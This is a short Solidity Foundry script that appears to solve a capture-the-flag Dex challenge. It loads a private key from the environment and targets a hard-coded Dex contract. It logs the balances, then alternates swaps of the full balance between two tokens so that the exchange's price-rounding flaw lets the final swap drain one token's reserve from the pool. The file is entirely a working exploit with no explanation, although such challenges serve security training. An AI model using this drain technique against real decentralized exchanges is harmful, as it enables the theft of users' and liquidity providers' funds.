// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Dex.sol";

contract DexScript is Script {
    
    address dexAddress = 0x1752c75cb5622355fC36169C848EAB72B7F5A8D5;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        address EOA = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
        Dex dex = Dex(dexAddress);
        address token1 = dex.token1(); 
        address token2 = dex.token2(); 
        console2.logAddress(token1);
        console2.logAddress(token2);
        console2.logUint(dex.balanceOf(token1, dexAddress));
        console2.logUint(dex.balanceOf(token2, dexAddress));
        console2.logUint(dex.balanceOf(token1, EOA));
        console2.logUint(dex.balanceOf(token2, EOA));
        dex.approve(dexAddress, 1 ether);

        dex.swap(token1, token2, dex.balanceOf(token1, EOA));
        dex.swap(token2, token1, dex.balanceOf(token2, EOA));
        dex.swap(token1, token2, dex.balanceOf(token1, EOA));
        dex.swap(token2, token1, dex.balanceOf(token2, EOA));
        dex.swap(token1, token2, dex.balanceOf(token1, EOA));
        dex.swap(token2, token1, dex.balanceOf(token2, dexAddress));
        
        
        
        console2.logUint(dex.balanceOf(token1, EOA));
        console2.logUint(dex.balanceOf(token2, EOA));
        vm.stopBroadcast();
    }
}
